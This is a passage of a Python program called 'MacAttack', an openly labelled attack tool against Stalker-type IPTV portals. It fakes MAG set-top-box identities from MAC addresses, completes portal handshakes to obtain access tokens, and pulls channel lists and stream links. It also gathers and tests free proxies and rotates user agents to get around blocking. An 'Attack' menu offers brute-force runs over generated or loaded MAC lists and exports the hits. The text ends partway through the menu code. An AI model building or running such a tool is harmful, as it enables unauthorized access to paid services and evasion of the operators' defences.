#!/usr/bin/env python3
# MacAttack Tkinter Edition (Ultimate Professional)
# Version: 5.5.0
# Author: LulzSecToolkit
# Current User: LulzSecToolkit
# Date: 2025-10-05 17:11:52 UTC
#
# Requirements:
#   - VLC installed on system (e.g., sudo apt install vlc)
#   - pip install python-vlc requests
#
# Run:
#   python3 MacAttack_tk_ultimate.py

import os
import sys
import re
import json
import time
import random
import hashlib
import logging
import configparser
import threading
import csv
import socket
from collections import deque
from datetime import datetime
from urllib.parse import urlparse, urlunparse, quote
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from tkinter import font as tkfont

try:
    import vlc
except ImportError:
    print("ERROR: python-vlc not installed. Run: pip install python-vlc")
    sys.exit(1)

APP_VERSION = "5.5.0"
CURRENT_USER = "LulzSecToolkit"

# Enhanced logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
logger = logging.getLogger(__name__)

# Optional: help VLC find plugins
os.environ.setdefault("VLC_PLUGIN_PATH", "/usr/lib/x86_64-linux-gnu/vlc/plugins")

# Globals
player_portaltype = None
PORTAL_FORCED = None

# User-Agent rotation pool
USER_AGENTS = [
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3",
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG254 stbapp ver: 2 rev: 250 Safari/533.3",
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 2 rev: 250 Safari/533.3",
]

# Free proxy sources
FREE_PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
]

# Professional Dark Theme Colors
class Theme:
    BG_DARK = "#0d1117"
    BG_MEDIUM = "#161b22"
    BG_LIGHT = "#21262d"
    
    ACCENT_PRIMARY = "#58a6ff"
    ACCENT_SECONDARY = "#f778ba"
    ACCENT_SUCCESS = "#3fb950"
    ACCENT_WARNING = "#d29922"
    ACCENT_ERROR = "#f85149"
    
    TEXT_PRIMARY = "#c9d1d9"
    TEXT_SECONDARY = "#8b949e"
    TEXT_MUTED = "#484f58"
    
    BUTTON_BG = "#238636"
    BUTTON_HOVER = "#2ea043"
    BUTTON_ACTIVE = "#3fb950"
    
    INPUT_BG = "#0d1117"
    INPUT_FG = "#c9d1d9"
    INPUT_BORDER = "#30363d"
    
    STATUS_IDLE = "#8b949e"
    STATUS_RUNNING = "#3fb950"
    STATUS_PAUSED = "#d29922"
    STATUS_ERROR = "#f85149"


def get_random_user_agent():
    """Return a random user agent from the pool."""
    return random.choice(USER_AGENTS)


def create_session_with_retries(max_retries=2):
    """Create a requests session with retry strategy."""
    session = requests.Session()
    retry_strategy = Retry(
        total=max_retries,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=20, pool_maxsize=50)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session


def normalize_base_url(host_input: str) -> str:
    """Return base URL with scheme and netloc only."""
    parsed = urlparse(host_input.strip())
    if not parsed.scheme and not parsed.netloc:
        parsed = urlparse(f"http://{host_input.strip()}")
    elif not parsed.scheme:
        parsed = parsed._replace(scheme="http")
    return urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))


def validate_mac_address(mac: str) -> bool:
    """Validate MAC address format."""
    pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    return bool(re.match(pattern, mac))


def fetch_free_proxies(sources=FREE_PROXY_SOURCES, timeout=8):
    """Fetch proxies from free sources using ThreadPoolExecutor."""
    proxies = set()
    
    def fetch_source(source):
        try:
            logger.info(f"Fetching proxies from: {source}")
            response = requests.get(source, timeout=timeout)
            if response.status_code == 200:
                lines = response.text.strip().split('\n')
                source_proxies = set()
                for line in lines:
                    line = line.strip()
                    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$', line):
                        source_proxies.add(line)
                logger.info(f"Fetched {len(source_proxies)} proxies from {source}")
                return source_proxies
        except Exception as e:
            logger.warning(f"Failed to fetch from {source}: {e}")
        return set()
    
    with ThreadPoolExecutor(max_workers=6) as executor:
        futures = [executor.submit(fetch_source, source) for source in sources]
        for future in as_completed(futures):
            proxies.update(future.result())
    
    return list(proxies)


def test_proxy_fast(proxy_str, timeout=5):
    """Ultra-fast proxy testing using socket connection."""
    try:
        # Parse proxy
        if '@' in proxy_str:
            # Has authentication
            auth, server = proxy_str.split('@')
            host, port = server.split(':')
        else:
            host, port = proxy_str.split(':')
        
        port = int(port)
        
        # Quick socket connection test
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        
        if result == 0:
            # Socket connected, now test with HTTP request
            try:
                proxies = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
                r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=timeout)
                if r.ok:
                    return True, r.json().get("origin", "")
            except:
                pass
        
        return False, None
    except Exception:
        return False, None


def detect_portal_type(base_url: str, headers: dict) -> str:
    """Detect portal type by probing version.js."""
    try:
        r = requests.get(f"{base_url}/c/version.js", headers=headers, timeout=10)
        if r.ok and re.search(r"var ver\s*=\s*['\"].*?['\"];", r.text):
            logger.info("Detected portal type: portal")
            return "portal"
    except requests.RequestException:
        pass

    try:
        r = requests.get(f"{base_url}/stalker_portal/c/version.js", headers=headers, timeout=10)
        if r.ok and re.search(r"var ver\s*=\s*['\"].*?['\"];", r.text):
            logger.info("Detected portal type: stalker_portal")
            return "stalker_portal"
    except requests.RequestException:
        pass

    logger.info("Portal type detection failed; defaulting to portal")
    return "portal"


def get_player_endpoint(ptype: str) -> str:
    """Get the player endpoint based on portal type."""
    if ptype == "portal":
        return "portal.php"
    elif ptype == "stalker_portal":
        return "stalker_portal/server/load.php"
    return "portal.php"


def get_token(session: requests.Session, url: str, mac: str, timeout: int = 20, 
              forced_ptype: str = None, max_retries: int = 2):
    """Perform handshake to get token with retry logic and better error handling."""
    global player_portaltype

    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    base_url = f"{parsed.scheme}://{host}:{port}"

    headers = {
        "User-Agent": get_random_user_agent(),
        "Accept-Encoding": "identity",
        "Accept": "*/*",
        "Connection": "keep-alive",
    }

    if forced_ptype in ("portal", "stalker_portal"):
        ptype = forced_ptype
    else:
        ptype = detect_portal_type(base_url, headers)
    player_portaltype = get_player_endpoint(ptype)
    portal_version = "5.3.1"

    handshake_url = f"{url}/{player_portaltype}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"

    serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
    sn = serialnumber[0:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()

    cookies = {
        "adid": hw_version_2,
        "debug": "1",
        "device_id2": device_id2,
        "device_id": device_id,
        "hw_version": "1.7-BD-00",
        "mac": mac,
        "sn": sn,
        "stb_lang": "en",
        "timezone": "America/Los_Angeles",
    }

    for attempt in range(max_retries):
        try:
            if attempt > 0:
                delay = (2 ** attempt) + random.uniform(0, 0.5)
                time.sleep(delay)

            resp = session.get(handshake_url, cookies=cookies, headers=headers, timeout=timeout)
            
            if resp.status_code == 512:
                logger.warning(f"Server returned 512 error - MAC may be invalid or blocked: {mac}")
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
                return None, None
            
            if resp.status_code == 403:
                logger.warning(f"Server returned 403 Forbidden - access denied")
                return None, None
            
            if resp.status_code == 429:
                logger.warning(f"Server returned 429 Too Many Requests - rate limited")
                time.sleep(3)
                continue

            resp.raise_for_status()
            
            try:
                json_data = resp.json()
            except json.JSONDecodeError as e:
                logger.error(f"Failed to parse JSON response: {e}")
                if attempt < max_retries - 1:
                    continue
                return None, None

            token = json_data.get("js", {}).get("token")
            token_random = json_data.get("js", {}).get("random")

            if token:
                logger.info(f"✓ Handshake successful! Token received for MAC: {mac}")
                session.headers.update({
                    "Connection": "keep-alive",
                    "User-Agent": headers["User-Agent"],
                    "Accept-Encoding": "identity",
                    "Accept": "*/*",
                    "Authorization": f"Bearer {token}",
                })
                if token_random:
                    session.headers.update({"X-Random": token_random})

                session.cookies.update(cookies)

                metrics = {
                    "mac": mac,
                    "sn": sn,
                    "type": "STB",
                    "model": "MAG250",
                    "uid": device_id,
                    "random": token_random or "0",
                }
                encoded_metrics = quote(json.dumps(metrics))
                sig = hashlib.sha256((sn + mac).encode()).hexdigest().upper()
                url1 = (
                    f"{url}/{player_portaltype}"
                    f"?type=stb&action=get_profile&hd=1"
                    f"&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; "
                    f"PORTAL version: {portal_version}; API Version: JS API version: 343; "
                    f"STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}"
                    f"&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi"
                    f"&device_id={device_id2}&device_id2={device_id2}"
                    f"&sig={sig}"
                    f"&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0"
                    f"&metrics={encoded_metrics}"
                    f"&hw_version_2={hw_version_2}&timestamp={round(time.time())}&api_sig=262&prehash=0"
                )
                try:
                    _ = session.get(url1, timeout=timeout)
                except requests.RequestException:
                    pass

                return token, token_random
            else:
                logger.warning(f"Token not found in handshake response for MAC: {mac}")
                if attempt < max_retries - 1:
                    continue
                return None, None
                
        except requests.exceptions.Timeout:
            logger.error(f"Handshake timeout (attempt {attempt + 1}/{max_retries})")
            if attempt < max_retries - 1:
                continue
        except requests.exceptions.ConnectionError as e:
            logger.error(f"Connection error during handshake (attempt {attempt + 1}/{max_retries}): {e}")
            if attempt < max_retries - 1:
                continue
        except Exception as e:
            logger.error(f"Handshake error (attempt {attempt + 1}/{max_retries}): {e}")
            if attempt < max_retries - 1:
                continue

    return None, None


def cookies_headers_for(session: requests.Session, mac: str, token: str, token_random: str):
    """Generate cookies and headers for authenticated requests."""
    serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
    sn = serialnumber[0:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
    cookies = {
        "adid": hw_version_2,
        "debug": "1",
        "device_id2": device_id2,
        "device_id": device_id,
        "hw_version": "1.7-BD-00",
        "mac": mac,
        "sn": sn,
        "stb_lang": "en",
        "timezone": "America/Los_Angeles",
        "token": token,
    }
    headers = {
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent(),
        "Authorization": f"Bearer {token}",
    }
    if token_random:
        headers["X-Random"] = token_random
    return cookies, headers


def fetch_categories(session, base_url, mac, token, token_random):
    """Return dict: { 'Live': [...], 'Movies': [...], 'Series': [...] }."""
    data = {"Live": [], "Movies": [], "Series": []}
    cookies, headers = cookies_headers_for(session, mac, token, token_random)

    try:
        u = f"{base_url}/{player_portaltype}?type=itv&action=get_genres&JsHttpRequest=1-xml"
        r = session.get(u, cookies=cookies, headers=headers, timeout=15)
        r.raise_for_status()
        js = r.json().get("js", [])
        data["Live"] = [
            {"name": item["title"], "category_type": "IPTV", "category_id": item["id"]}
            for item in js
        ]
        data["Live"].sort(key=lambda x: x["name"])
    except Exception as e:
        logger.warning(f"get_genres failed: {e}")

    try:
        u = f"{base_url}/{player_portaltype}?type=vod&action=get_categories&JsHttpRequest=1-xml"
        r = session.get(u, cookies=cookies, headers=headers, timeout=15)
        r.raise_for_status()
        js = r.json().get("js", [])
        data["Movies"] = [
            {"name": item["title"], "category_type": "VOD", "category_id": item["id"]}
            for item in js
        ]
        data["Movies"].sort(key=lambda x: x["name"])
    except Exception as e:
        logger.warning(f"get_vod_categories failed: {e}")

    try:
        u = f"{base_url}/{player_portaltype}?type=series&action=get_categories&JsHttpRequest=1-xml"
        r = session.get(u, cookies=cookies, headers=headers, timeout=15)
        r.raise_for_status()
        js = r.json().get("js", [])
        data["Series"] = [
            {"name": item["title"], "category_type": "Series", "category_id": item["id"]}
            for item in js
        ]
        data["Series"].sort(key=lambda x: x["name"])
    except Exception as e:
        logger.warning(f"get_series_categories failed: {e}")

    return data


def fetch_channels(session, base_url, mac, token, token_random, category_type, category_id):
    """Return a list of channels/items for the given category."""
    cookies, headers = cookies_headers_for(session, mac, token, token_random)

    if category_type == "IPTV":
        base = f"{base_url}/{player_portaltype}?type=itv&action=get_ordered_list&genre={category_id}"
    elif category_type == "VOD":
        base = f"{base_url}/{player_portaltype}?type=vod&action=get_ordered_list&category={category_id}"
    elif category_type == "Series":
        base = f"{base_url}/{player_portaltype}?type=series&action=get_ordered_list&category={category_id}"
    else:
        return []

    items = []
    try:
        r0 = session.get(f"{base}&JsHttpRequest=1-xml&p=0", cookies=cookies, headers=headers, timeout=20)
        r0.raise_for_status()
        js = r0.json()
        total_items = int(js.get("js", {}).get("total_items", 0))
        data0 = js.get("js", {}).get("data", [])
        for ch in data0:
            ch["item_type"] = (
                "series" if category_type == "Series" else ("vod" if category_type == "VOD" else "channel")
            )
        items.extend(data0)
        ipp = len(data0)
        total_pages = (total_items + max(ipp, 1) - 1) // max(ipp, 1)

        for p in range(1, min(total_pages, 10)):
            r = session.get(f"{base}&JsHttpRequest=1-xml&p={p}", cookies=cookies, headers=headers, timeout=20)
            r.raise_for_status()
            jsn = r.json().get("js", {}).get("data", [])
            for ch in jsn:
                ch["item_type"] = (
                    "series" if category_type == "Series" else ("vod" if category_type == "VOD" else "channel")
                )
            items.extend(jsn)

        uniq = {}
        for ch in items:
            cid = ch.get("id")
            if cid not in uniq:
                uniq[cid] = ch
        items = list(uniq.values())
        items.sort(key=lambda x: x.get("name", "") or x.get("title", ""))

        return items
    except Exception as e:
        logger.error(f"fetch_channels failed: {e}")
        return []


def create_link(session, base_url, mac, token, token_random, cmd, episode_number=None, media_type_hint=None):
    """Create a playable link via API; returns stream_url or None."""
    cookies, headers = cookies_headers_for(session, mac, token, token_random)
    if cmd.startswith("ffmpeg "):
        cmd = cmd[len("ffmpeg "):]
    cmd_encoded = quote(cmd)

    if episode_number is not None or media_type_hint == "vod":
        url = f"{base_url}/{player_portaltype}?type=vod&action=create_link&cmd={cmd_encoded}"
        if episode_number is not None:
            url += f"&series={episode_number}"
        url += "&JsHttpRequest=1-xml"
    else:
        url = f"{base_url}/{player_portaltype}?type=itv&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"

    try:
        r = session.get(url, cookies=cookies, headers=headers, timeout=20)
        r.raise_for_status()
        js = r.json()
        cmd_val = js.get("js", {}).get("cmd")
        if cmd_val:
            if cmd_val.startswith("ffmpeg "):
                cmd_val = cmd_val[len("ffmpeg "):]
            return cmd_val
        return None
    except Exception as e:
        logger.error(f"create_link failed: {e}")
        return None


class ProxyTestDialog(tk.Toplevel):
    """Ultra-fast proxy testing dialog with concurrent testing."""
    def __init__(self, parent, proxies):
        super().__init__(parent)
        self.parent = parent
        self.proxies = proxies
        self.results = []
        self.tested_count = 0
        self.working_count = 0
        self.failed_count = 0
        self.is_testing = True
        
        self.title(f"⚡ Ultra-Fast Proxy Testing - {len(proxies)} proxies")
        self.geometry("700x500")
        self.configure(bg=Theme.BG_DARK)
        
        self.transient(parent)
        self.grab_set()
        
        self._build_ui()
        self.protocol("WM_DELETE_WINDOW", self.on_close)
        
        self.after(100, self.start_testing)
    
    def _build_ui(self):
        # Title
        title_frame = tk.Frame(self, bg=Theme.BG_MEDIUM, height=60)
        title_frame.pack(fill="x")
        title_frame.pack_propagate(False)
        
        tk.Label(
            title_frame,
            text="⚡ ULTRA-FAST PROXY SCANNER",
            font=("Helvetica", 16, "bold"),
            bg=Theme.BG_MEDIUM,
            fg=Theme.ACCENT_PRIMARY
        ).pack(pady=15)
        
        # Stats frame
        stats_frame = tk.Frame(self, bg=Theme.BG_LIGHT)
        stats_frame.pack(fill="x", padx=20, pady=15)
        
        stats_grid = tk.Frame(stats_frame, bg=Theme.BG_LIGHT)
        stats_grid.pack()
        
        self.tested_label = tk.Label(
            stats_grid,
            text=f"0 / {len(self.proxies)}",
            font=("Helvetica", 24, "bold"),
            bg=Theme.BG_LIGHT,
            fg=Theme.ACCENT_PRIMARY
        )
        self.tested_label.grid(row=0, column=0, padx=20)
        
        tk.Label(stats_grid, text="TESTED", font=("Helvetica", 9), 
                bg=Theme.BG_LIGHT, fg=Theme.TEXT_SECONDARY).grid(row=1, column=0)
        
        self.working_label = tk.Label(
            stats_grid,
            text="0",
            font=("Helvetica", 24, "bold"),
            bg=Theme.BG_LIGHT,
            fg=Theme.ACCENT_SUCCESS
        )
        self.working_label.grid(row=0, column=1, padx=20)
        
        tk.Label(stats_grid, text="WORKING", font=("Helvetica", 9), 
                bg=Theme.BG_LIGHT, fg=Theme.TEXT_SECONDARY).grid(row=1, column=1)
        
        self.failed_label = tk.Label(
            stats_grid,
            text="0",
            font=("Helvetica", 24, "bold"),
            bg=Theme.BG_LIGHT,
            fg=Theme.ACCENT_ERROR
        )
        self.failed_label.grid(row=0, column=2, padx=20)
        
        tk.Label(stats_grid, text="FAILED", font=("Helvetica", 9), 
                bg=Theme.BG_LIGHT, fg=Theme.TEXT_SECONDARY).grid(row=1, column=2)
        
        # Progress bar
        prog_frame = tk.Frame(self, bg=Theme.BG_DARK)
        prog_frame.pack(fill="x", padx=20, pady=10)
        
        self.progress = ttk.Progressbar(
            prog_frame,
            orient="horizontal",
            mode="determinate",
            maximum=len(self.proxies)
        )
        self.progress.pack(fill="x")
        
        self.speed_label = tk.Label(
            prog_frame,
            text="Speed: 0 proxies/sec",
            font=("Helvetica", 10),
            bg=Theme.BG_DARK,
            fg=Theme.ACCENT_WARNING
        )
        self.speed_label.pack(pady=5)
        
        # Output text
        output_frame = tk.Frame(self, bg=Theme.BG_DARK)
        output_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        self.output_text = tk.Text(
            output_frame,
            height=12,
            bg=Theme.INPUT_BG,
            fg=Theme.ACCENT_SUCCESS,
            font=("Courier", 9),
            wrap="word"
        )
        scrollbar = ttk.Scrollbar(output_frame, orient="vertical", command=self.output_text.yview)
        self.output_text.configure(yscrollcommand=scrollbar.set)
        self.output_text.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Buttons
        btn_frame = tk.Frame(self, bg=Theme.BG_DARK)
        btn_frame.pack(fill="x", padx=20, pady=15)
        
        self.stop_btn = tk.Button(
            btn_frame,
            text="⏹ STOP TESTING",
            command=self.stop_testing,
            bg=Theme.ACCENT_ERROR,
            fg=Theme.TEXT_PRIMARY,
            font=("Helvetica", 11, "bold"),
            relief="flat",
            padx=25,
            pady=10,
            cursor="hand2"
        )
        self.stop_btn.pack(side="left", padx=5)
        
        self.close_btn = tk.Button(
            btn_frame,
            text="CLOSE",
            command=self.on_close,
            bg=Theme.BUTTON_BG,
            fg=Theme.TEXT_PRIMARY,
            font=("Helvetica", 11),
            relief="flat",
            padx=25,
            pady=10,
            cursor="hand2",
            state="disabled"
        )
        self.close_btn.pack(side="right", padx=5)
    
    def append_output(self, text):
        self.output_text.insert("end", text)
        self.output_text.see("end")
        self.update_idletasks()
    
    def update_stats(self, speed=0):
        self.tested_label.config(text=f"{self.tested_count} / {len(self.proxies)}")
        self.working_label.config(text=str(self.working_count))
        self.failed_label.config(text=str(self.failed_count))
        self.progress["value"] = self.tested_count
        self.speed_label.config(text=f"Speed: {speed:.1f} proxies/sec")
        self.update_idletasks()
    
    def start_testing(self):
        """Start ultra-fast proxy testing with concurrent workers."""
        self.append_output("⚡ Starting ultra-fast concurrent proxy testing...\n")
        self.append_output(f"📊 Testing {len(self.proxies)} proxies with {min(100, len(self.proxies))} workers\n\n")
        
        start_time = time.time()
        
        def test_worker():
            max_workers = min(100, len(self.proxies))  # Ultra-fast: 100 concurrent tests
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_proxy = {executor.submit(test_proxy_fast, proxy): proxy for proxy in self.proxies}
                
                for future in as_completed(future_to_proxy):
                    if not self.is_testing:
                        executor.shutdown(wait=False)
                        break
                    
                    proxy = future_to_proxy[future]
                    
                    try:
                        ok, origin = future.result()
                    except Exception:
                        ok, origin = False, None
                    
                    self.tested_count += 1
                    elapsed = time.time() - start_time
                    speed = self.tested_count / elapsed if elapsed > 0 else 0
                    
                    if ok:
                        self.working_count += 1
                        self.results.append(proxy)
                        status = "✅"
                        origin_str = f" ({origin})" if origin else ""
                    else:
                        self.failed_count += 1
                        status = "❌"
                        origin_str = ""
                    
                    # Update UI every 10 proxies or if working
                    if self.tested_count % 10 == 0 or ok:
                        self.after(0, lambda p=proxy, s=status, o=origin_str: 
                                  self.append_output(f"[{self.tested_count}/{len(self.proxies)}] {s} {p}{o}\n"))
                        self.after(0, lambda spd=speed: self.update_stats(spd))
            
            self.after(0, self.testing_complete)
        
        threading.Thread(target=test_worker, daemon=True).start()
    
    def testing_complete(self):
        self.is_testing = False
        self.stop_btn.config(state="disabled")
        self.close_btn.config(state="normal")
        self.append_output(f"\n{'='*60}\n")
        self.append_output(f"✅ TESTING COMPLETE!\n")
        self.append_output(f"Working Proxies: {self.working_count}/{len(self.proxies)} ({self.working_count/len(self.proxies)*100:.1f}%)\n")
        self.append_output(f"{'='*60}\n")
    
    def stop_testing(self):
        self.is_testing = False
        self.append_output("\n⏹ Testing stopped by user.\n")
        self.stop_btn.config(state="disabled")
        self.close_btn.config(state="normal")
    
    def on_close(self):
        self.is_testing = False
        self.grab_release()
        self.destroy()


class MacAttackApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(f"MacAttack Ultimate v{APP_VERSION} - by {CURRENT_USER}")
        self.geometry("1500x950")
        self.configure(bg=Theme.BG_DARK)
        
        # Setup theme
        self._setup_theme()
        
        # State
        self.session = create_session_with_retries()
        self.base_url = ""
        self.mac = ""
        self.token = None
        self.token_random = None
        self.token_ts = 0

        # Proxy usage
        self.proxy_list = []
        self.proxy_enabled = tk.BooleanVar(value=False)
        self.proxy_remove_after_errors = tk.IntVar(value=5)
        self.alt_proxy_speed = tk.BooleanVar(value=False)

        # Attack state
        self.running_attack = False
        self.paused_attack = False
        self.attack_threads = []
        self.macs_pool = deque()
        self.hits_count = 0
        self.tested_macs = set()
        self.found_macs_list = []
        
        # Statistics
        self.stats = {
            "total_tested": 0,
            "hits": 0,
            "errors": 0,
            "start_time": None,
        }

        # VLC player
        self.vlc_instance = None
        self.vlc_player = None

        # Favorites
        self.favorites = []

        # Settings
        self.settings_path = os.path.join(os.path.expanduser("~"), "evilvir.us")
        os.makedirs(self.settings_path, exist_ok=True)
        self.config_file = os.path.join(self.settings_path, "MacAttack.ini")
        self.favorites_file = os.path.join(self.settings_path, "favorites.json")

        # Rate limiting
        self.request_delay = tk.DoubleVar(value=0.3)

        # Build UI with menu
        self._build_menu()
        self._build_ui()

        # Init VLC
        self.init_vlc_instance()

        # Load settings and favorites
        self.load_settings()
        self.load_favorites()

        # Update stats periodically
        self.update_statistics()

        # Clean close
        self.protocol("WM_DELETE_WINDOW", self.on_close)

    def _setup_theme(self):
        """Setup professional dark theme"""
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure('TNotebook', background=Theme.BG_DARK, borderwidth=0)
        style.configure('TNotebook.Tab', 
                       background=Theme.BG_MEDIUM,
                       foreground=Theme.TEXT_SECONDARY,
                       padding=[20, 10],
                       font=('Helvetica', 10, 'bold'))
        style.map('TNotebook.Tab',
                 background=[('selected', Theme.BG_LIGHT)],
                 foreground=[('selected', Theme.ACCENT_PRIMARY)])
        
        style.configure('TFrame', background=Theme.BG_DARK)
        style.configure('TLabel', background=Theme.BG_DARK, foreground=Theme.TEXT_PRIMARY)
        style.configure('TButton', 
                       background=Theme.BUTTON_BG,
                       foreground=Theme.TEXT_PRIMARY,
                       borderwidth=0,
                       focuscolor='none',
                       padding=[10, 5])
        style.map('TButton',
                 background=[('active', Theme.BUTTON_HOVER)])
        
        style.configure('TEntry',
                       fieldbackground=Theme.INPUT_BG,
                       foreground=Theme.INPUT_FG,
                       bordercolor=Theme.INPUT_BORDER,
                       lightcolor=Theme.INPUT_BORDER,
                       darkcolor=Theme.INPUT_BORDER)
        
        style.configure('TCombobox',
                       fieldbackground=Theme.INPUT_BG,
                       foreground=Theme.INPUT_FG,
                       arrowcolor=Theme.TEXT_PRIMARY,
                       bordercolor=Theme.INPUT_BORDER)
        
        style.configure('TSpinbox',
                       fieldbackground=Theme.INPUT_BG,
                       foreground=Theme.INPUT_FG,
                       arrowcolor=Theme.TEXT_PRIMARY,
                       bordercolor=Theme.INPUT_BORDER)
        
        style.configure('Horizontal.TProgressbar',
                       background=Theme.ACCENT_PRIMARY,
                       troughcolor=Theme.BG_MEDIUM,
                       bordercolor=Theme.BG_MEDIUM,
                       lightcolor=Theme.ACCENT_PRIMARY,
                       darkcolor=Theme.ACCENT_PRIMARY)

    def _build_menu(self):
        """Build menu bar with all options."""
        menubar = tk.Menu(self, bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                         activebackground=Theme.ACCENT_PRIMARY, activeforeground=Theme.TEXT_PRIMARY)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0, bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY)
        file_menu.add_command(label="📥 Import Settings", command=self.import_settings)
        file_menu.add_command(label="💾 Export Settings", command=self.export_settings)
        file_menu.add_separator()
        file_menu.add_command(label="📊 Export Hits (CSV)", command=self.export_hits_csv)
        file_menu.add_command(label="📄 Export Hits (JSON)", command=self.export_hits_json)
        file_menu.add_separator()
        file_menu.add_command(label="📝 Export Logs", command=self.export_logs)
        file_menu.add_separator()
        file_menu.add_command(label="🚪 Exit", command=self.on_close)
        menubar.add_cascade(label="📁 File", menu=file_menu)
        
        # Attack menu
        attack_menu = tk.Menu(menubar, tearoff=0, bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY)
        attack_menu.add_command(label="▶ Start Attack", command=self.start_attack)
        attack_menu.add_command(label="⏸ Pause/Resume", command=self.pause_resume_attack)
        attack_menu.add_command(label="⏹ Stop Attack", command=self.stop_attack)
        attack_menu.add_separator()
        attack_menu.add_command(label="🔍 Test Single MAC", command=self.test_single_mac_dialog)
        attack_menu.add_command(label="📁 Load MAC List", command=self._select_mac_file)
        attack_menu.add_separator()
        attack_menu.add_command(label="🗑️ Clear Output", command=lambda: self.output_text.delete("1.0", "end"))
        attack_menu.add_command(label="🗑️ Clear Errors", command=lambda: self.error_text.delete("1.0", "end"))
        menubar.add_cascade(label="🔥 Attack", menu=attack_menu)
        
        # Proxy menu
        proxy_menu = tk.Menu(menubar, tearoff=0, bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY)
        proxy_menu.add_command(label="🌐 Fetch Free Proxies", command=self.fetch_free_proxies_ui)
        proxy_menu.add_command(label="⚡ Test Proxies (Ultra-Fast)", command=self.test_proxies)
        proxy_menu.add_separator()
        proxy_menu.add_command(label="📥 Import Proxies", command=self.import_proxies)
        proxy_menu.add_command(label="💾 Export Proxies", command=self.export_proxies)
        proxy_menu.add_separator()
        proxy_menu.add_checkbutton(label="Enable Proxies", variable=self.proxy_enabled)
        menubar.add_cascade(label="🌐 Proxies", menu=proxy_menu)
        
        # Player menu
        player_menu = tk.Menu(menubar, tearoff=0, bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY)
        player_menu.add_command(label="📥 Get Playlist", command=self.player_get_playlist)
        player_menu.add_command(label="🗑️ Clear Playlist", command=self.player_clear_playlist)
        player_menu.add_separator()
        player_menu.add_command(label="▶ Play/Pause", command=self.toggle_play)
        player_menu.add_command(label="⏹ Stop", command=self.stop_video)
        player_menu.add_separator()
        player_menu.add_command(label="📷 Take Screenshot", command=self.take_screenshot)
        player_menu.add_command(label="🔊 Audio Tracks", command=self.select_audio_track)
        player_menu.add_command(label="💬 Subtitles", command=self.select_subtitle)
        menubar.add_cascade(label="📺 Player", menu=player_menu)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0, bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY)
        tools_menu.add_command(label="📊 View Statistics", command=lambda: self.notebook.select(3))
        tools_menu.add_command(label="🔄 Reset Statistics", command=self.reset_statistics)
        tools_menu.add_separator()
        tools_menu.add_command(label="🔍 MAC Validator", command=self.open_mac_validator)
        tools_menu.add_command(label="🎲 MAC Generator", command=self.open_mac_generator)
        tools_menu.add_separator()
        tools_menu.add_command(label="📡 Network Info", command=self.show_network_info)
